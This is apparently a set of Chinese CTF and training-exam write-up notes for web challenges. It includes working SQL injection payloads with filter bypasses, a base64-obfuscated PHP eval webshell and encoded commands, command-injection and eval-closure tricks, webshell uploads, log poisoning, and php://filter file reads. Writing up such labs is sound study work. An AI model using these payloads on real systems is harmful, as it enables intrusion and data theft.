[嘤嘤嘤]timesql #SQL注入漏洞 时间/盲注
题名写了timesql但是测试直接异或盲注他回显不一致，就用异或盲注，服务器太烂了，用时间盲注时间一大一小看不清结果。
全程用bp做
爆数据库名 为hazel
```
username=admin'%20anandd%20subsubstrstr(database()%2c§1§%2c1)%3d'§2§'%20%23&password=114514
```
![[Pasted image 20240327161324.png]]
爆表名长度 为5
```
username=admin'%20anandd%20length((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase()))%20%3d%20§1§%20%23
```
![[Pasted image 20240328190530.png]]
爆表名 为 users
```
username=admin'%20anandd%20subsubstrstr((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§a§'%20%23
```
![[Pasted image 20240328191209.png]]
爆字段名 为 id,username,password
```
username=admin'%20anandd%20subsubstrstr((selselectect%20group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3d'users'%20anandd%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§i§'%20%23
```
![[Pasted image 20240328193336.png]]
爆字段(payload列表注意加上flag所需的字符)：
```
admin'%20anandd%20subsubstrstr((selselectect%20group_concat(id%2c%22%3a%22%2cusername%2c%22%3a%22%2cpasswoorrd%2c%22%3a%22)%20frfromom%20hazel.users)%2c§1§%2c1)%20%3d%20'§i§'%20%23
```

| id  | username | password                                    |
| --- | -------- | ------------------------------------------- |
| 0   | admin    | admin666666                                 |
| 1   | hazel    | hazel{d3f3bac6-3fe8-4e5e-8680-40a5b0003799} |

[嘤嘤嘤]insertsql #SQL注入漏洞 
insert注入，查看页面，有上传文章的功能
![[Pasted image 20240329124443.png]]
尝试在标题注入，其显示上传失败，并快速重定向至主页面，但是显示了一瞬间的sql语句，打开BP的intercept,显示出了其使用的sql语句： ^d26139
```
insert into article(title,author,description,content,dateline) values('114514' and 1=2#','114514','114514','114514',1711687035)
```
可以看到除了标题还有4个字段，那就在标题构造注入：
```
114514',database(),user(),'114514',1919810)#
```
去管理文章的页面点击修改我们刚发布的文章，可以看到其回显了数据库名以及用户名：
![[Pasted image 20240329124936.png]]
爆表名 为article,hazel
```
10086',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'10086','10086','1919810')#
```

^1e5e69

![[Pasted image 20240329125252.png]]
爆字段名 为 id,flag_is_here
```
10086',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="hazel"),'10086','10086','1919810')#
```
![[Pasted image 20240329125514.png]]
dump
```
10086',(select flag_is_here from hazel.hazel where id=2),'10086','10086','1919810')#
```

| id  | flag_is_here                                |
| --- | ------------------------------------------- |
| 1   | shuaige                                     |
| 2   | hazel{863184db-8501-49b4-a8c9-96bc10101c72} |

[嘤嘤嘤]成绩单 #SQL注入漏洞 
页面只有一个查询框，查1出成绩，查异常值不出，尝试布尔盲注猜解闭合方式为：单引号闭合
`1' and 1=2 #`
爆数据库名长度 为 5
```
id=1'+and+length(database())%3d§1§%23
```
![[Pasted image 20240329131949.png]]
爆数据库名 为 hazel
```
id=1'+and+substr(database(),§1§,1)%3d'§1§'%23
```
![[Pasted image 20240329132535.png]]
爆表名总长度 为 7
```
id=1'+and+length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()))%3d§1§%23
```
![[Pasted image 20240329132859.png]]
爆表名 为 fl4g,sc
```
id=1'+and+substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),§1§,1)%3d'§1§'%23
```
![[Pasted image 20240329133352.png]]
爆字段长度 为 10
```
id=1'+and+length((select+group_concat(column_name)+from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d'fl4g'))%3d§1§%23
```
![[Pasted image 20240329135041.png]]
dump长度 为42
```
id=1'+and+length((select+*+from+hazel.fl4g))%3d§1§%23
```
dump
```
id=1'+and+substr((select+*+from+hazel.fl4g),§1§,1)%3d'§1§'%23
```
```
hazel{8c4c152d-1aa9-4991-8aac-951ca6e3efa0}
```
[嘤嘤嘤]P1_1
base64加密注入，爆字段数找回显点（让他的不成立）不要用and，页面也不会回显错误，错误就不显示结果
[嘤嘤嘤]P1_2
[嘤嘤嘤]P1_3
```
<?php

@$a = $_POST['Hello'];

if(isset($a)){

@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10='));

}

?>

Hello

<br>

閫忚繃鐜拌薄鐪嬫湰璐紝涓栫晫寰堢畝鍗曪紒

W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=

[@eval(base64_decode($_POST[z0]));]

z0=system('ls'); --> z0=c3lzdGVtKCdscycpOw==

Hello=12312321&z0=c3lzdGVtKCdscycpOw==

Hello=12312321&z0=c3lzdGVtKCd0YWMgLi4va2V5LnBocCcpOw==
```

^bf5f69

[嘤嘤嘤]P1_4
命令执行，
过滤了cat head tail cp mv vi vim
使用grep '\*' ../flag拿flag
[嘤嘤嘤]P1_5
直接禁用JS防止其生成随机数，登录
这题key错的
[嘤嘤嘤]P2_1
sql注入
过滤：
`空格 # union`
绕过：
`/**/ %23 ununionion`
不过只是让读取文件，直接loadfile
[嘤嘤嘤]P2_2
文件上传
直接传带图片头的图片拦截加马改phtml
[嘤嘤嘤]P2_3
文件包含
使用php://filter/read=convert.base64-encode/resource=..key.php
拿到flag
[嘤嘤嘤]P2_4
命令执行
过滤了ls cat，直接定义变量绕过
[嘤嘤嘤]P2_5
日志跳
[嘤嘤嘤]P3_1
二次注入
注册admin'#123，重置密码，改的是admin密码。
[嘤嘤嘤]wP3_2
文件上传
很简单只做了文件头过滤，没过滤php，所以不要一上来试phtml，万一php就行呢
[嘤嘤嘤]P3_3
和[[EXAM特供WP#^bf5f69]]P1_3一样的
[嘤嘤嘤]P3_4
代审&命令执行
cmd参数长度小于30执行cmd但不回显。
使用反引号执行命令将其重定向至文件
有admin文件夹及其下的backdoor.php
构造命令超30，使用通配符减小长度。
```
GET /start/vul.php?cmd=echo+"`cat+../a*/*.php`">1.txt
```
[嘤嘤嘤]P3_5
命令执行
过滤了; ls php使用&& 变量 通配符绕过。
[嘤嘤嘤]P4_1
有文章上传功能，是insert注入和[[EXAM特供WP#^d26139]]一样
```
insert into article(title,author,description,content,dateline) values('1'','13123','3131','313',1713177034)
```
[嘤嘤嘤]P4_2
文件上传
直接传图片马
[嘤嘤嘤]P4_3
文件包含，但是没key
[嘤嘤嘤]P4_4
命令执行
```
<?php
error_reporting(0);
include "key4.php";
$a=$_GET["a"];
eval("\$o=strtolower(\"$a\");");
echo $o;
show_source(__FILE__);
?>
```
构造
`");system('ls');//`
闭合strlower,注释后面的
[嘤嘤嘤]P4_5
改cookie，base64加密的名字和直接写cookie里的isadmin
[嘤嘤嘤]P5_1
无
[嘤嘤嘤]P5_2
文件包含
获取日志，useragent传马
[嘤嘤嘤]P5_3
命令执行
过滤了 ；ls cat
使用&& 变量过
[嘤嘤嘤]P5_4
文件上传
直接传图片马
[嘤嘤嘤]P5_5
同上
[嘤嘤嘤]P6_1
sql注入
`http://hazelshishuaige.club:9111/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d67' union select 1,(select group_concat(haha) from hazel.IS_KEY),3,4,5,6 and '1'='1`
过滤了注释符，爆列数得用union select，order by 无回显
[嘤嘤嘤]P6_2
文件上传
过滤了php,MIME头，敏感函数，evalassert等，以及文件头验证
直接传马，成功，不知道为什么php过滤没起作用
[嘤嘤嘤]P6_3
固定后缀00截断超长get都不起作用
直接内网机器挂http，用http协议拿马txt
[嘤嘤嘤]P6_4
挂错了，反序列挂的命令
[嘤嘤嘤]P6_5
失效访问控制
cookie改名字，isadmin
加XFF头本地访问。
[嘤嘤嘤]pte1_055
暴力破解带验证码直接关闭JS拦截此次正确的验证码重复请求
密码123qwe，flag在F1a9.php但是找不到
[嘤嘤嘤]pte1_051
sql注入
过滤了# ；“ -- or
`admin' Or 1=1 Or '1'='1`
拿到f1a9.php
[嘤嘤嘤]pte1_045
日志题，跳
[嘤嘤嘤]pte1_041
sql注入
闭合注释显示正常而and 1=1显示不正常的直接不要and
flag-{bmhbb1bbe71-f818-4743-a418-7a7854a4e42f}
flag错的
[嘤嘤嘤]pte1_025
日志题，跳
[嘤嘤嘤]pte1_fuzz
暴力破解+命令执行
禁用JS破解，输入base64命令
/tmp下没有flag
[嘤嘤嘤]pte1_024
命令执行
过滤了cat head tail cp mv
使用vi vim 或者tee或者变量都行
key错的
[嘤嘤嘤]pte1_022
文件上传，找专题练
[嘤嘤嘤]pte1_021
sql注入
数字型
过滤空格 union and 单引号
正常流程过
[嘤嘤嘤]pte1_002
文件上传，过
[嘤嘤嘤]pte1_033
用php://filter/convert.base64-encode/resource=
[嘤嘤嘤]pte3_00-01
sql注入
过滤空格 Union \#
[嘤嘤嘤]cms-sqlgun
sqlmap梭id不行
梭搜索功能成功
拿到admin/admin凭证
[嘤嘤嘤]pte5_6
```python
import hashlib

  

fdict = []

filename = input('filename:')

for i in range(1,100000):

    o=hashlib.md5()

    o.update((filename+str(i)).encode('utf-8'))

    fdict.append(o.hexdigest()+'.php\n')

with open('filedict.txt','x') as f:

    f.writelines(fdict)
```
上传114514.php 马
文件名形如58612212ea92229dfb02fb03026949d0.php
找到200请求即可
[嘤嘤嘤]pte_综合题1
`http://hazelshishuaige.club:26080/`
`113.120.11.226:26080`
`113.120.11.226:26389`
进入网站扫描目录phpadmin
`show variables like %secure_file_priv%`
确定上传文件权限
弱口令登入，执行into outfile写马
确定绝对路径：
`select load_file "C:||"`
[嘤嘤嘤]sql_duidie
堆叠语句注入，使用show语句，过滤了select，使用HANDLER读列见[[WP#^396303]]
[嘤嘤嘤]sql_changgui
过滤空格，or,等等连接词，报错注入
表名
```
shit'/**/anandd/**/updatexml(1,concat(0x7e,(seselectlect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/whwhereere/**/table_schema=database())),1)#
```
列名同理，加id=?的条件
右半边flag:
```
shit'/**/anandd/**/updatexml(1,concat(0x7e,(seselectlect/**/right(group_concat(id,username,passwoorrd),30)/**/frfromom/**/geek.ssql/**/whwhereere/**/id=5)),1)#
```
3-12fd-4ae8-acd2-2f7200071e54}
左半边flag
```
shit'/**/anandd/**/updatexml(1,concat(0x7e,(seselectlect/**/left(group_concat(id,username,passwoorrd),30)/**/frfromom/**/geek.ssql/**/whwhereere/**/id=5)),1)#
```
flaghazel{9f2da823-12fd-4ae8-
flag:
hazel{9f2da823-12fd-4ae8-acd2-2f7200071e54}
[嘤嘤嘤]sql_twicesql
二次注入，登陆后的输入框会注释掉我们的引号。
而用户名注入又不会回显错误，所以 想用orderby确定列数是不现实的。
第一步直接`1' union select database() #`
数据库名：ctftraining
接下来
`1' union select group_concat(table_name) from information_schema.tables where table_schema=database()#`
表名：flag,news,users
接下来
`1' union select group_concat(column_name) from information_schema.columns where table_name='flag'#`
列名：flag
接下来
`1' union select group_concat(flag) from ctftraining.flag#`
hazel{31d39468-d3d1-4f6e-b600-30cc5460453d}
[嘤嘤嘤]sql_insertsql2
过滤`,` `\`byd用运算符有奇效
```
email=3%40§1§&username=0'%2b(select%20substr(hex(hex(database()))%20from%20§1§%20for%2015))%2b'0&password=123
```
![[Pasted image 20240427171535.png]]用pitchfork
登录看hex值。
`363836313741363536433546333233333333`
`68617A656C5F323333`
`hazel_233`
